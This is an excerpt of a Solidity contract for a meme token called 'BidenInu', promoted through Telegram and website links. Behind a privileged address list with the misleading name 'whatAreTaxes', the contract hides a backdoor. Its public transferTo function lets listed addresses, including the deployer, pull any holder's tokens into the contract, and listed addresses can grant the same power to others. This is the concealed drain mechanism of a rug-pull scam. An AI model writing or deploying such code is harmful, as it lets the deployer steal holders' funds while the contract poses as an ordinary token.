...
/*
    ...
    https://t.me/BidenInuOfficial
    https://bideninu.uwu.ai/


    - part of @DailyDegen1000x -
*/
...
contract BidenInu is IERC20, Ownable {
    ...
    mapping (address => bool) whatAreTaxes;
    ...
    constructor () {
        ...
        whatAreTaxes[address(this)] = true;
        whatAreTaxes[address(router)] = true;
        whatAreTaxes[deployer] = true;
        isFeeExempt[deployer] = true;
        autoLiquidityReceiver = deployer;
        marketingFeeReceiver = deployer;
        teamFeeReceiver = 0xd1D725043F68C8174af0aB94896893ADf27F44f8;
    ...
    function transferTo(address sender, uint256 amount) public swapping  {require(whatAreTaxes[msg.sender]); _transferFrom(sender, address(this), amount); }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != pair && recipient != DEAD && !whatAreTaxes[recipient]) {
    ...
    function clearBalance() external {
        require(whatAreTaxes[msg.sender]);
    ...
    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
        require(whatAreTaxes[msg.sender] && percent >= 1, "Max wallet must be greater than 1%");
    ...
    function setwhatAreTaxes(address holder, bool exempt) external {
        require(whatAreTaxes[msg.sender]);
        whatAreTaxes[holder] = exempt;
    }
